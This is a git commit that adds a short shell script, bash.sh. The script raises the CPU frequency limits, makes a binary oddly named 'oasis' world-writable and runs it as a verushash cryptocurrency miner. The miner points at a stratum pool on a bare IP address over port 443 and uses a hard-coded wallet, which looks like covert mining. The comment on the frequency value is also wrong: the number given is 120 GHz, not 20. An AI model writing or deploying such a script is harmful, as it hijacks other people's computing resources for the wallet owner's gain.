db1b01648a76e7b6524c47009788859109573c20
danielasase <danielas@kadetjuara.web.id>
2024-12-30 10:56:33 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,12 @@
+
+CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
+MAX_FREQ=120000000 # Maksimal frekuensi dalam kHz (20 GHz)
+
+for dir in $CPUFREQ_PATH; do
+    if [ -e $dir/scaling_max_freq ]; then
+        echo $MAX_FREQ > $dir/scaling_max_freq
+    fi
+done
+
+chmod 777 oasis
+./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-OF --password x --cpu-threads 4
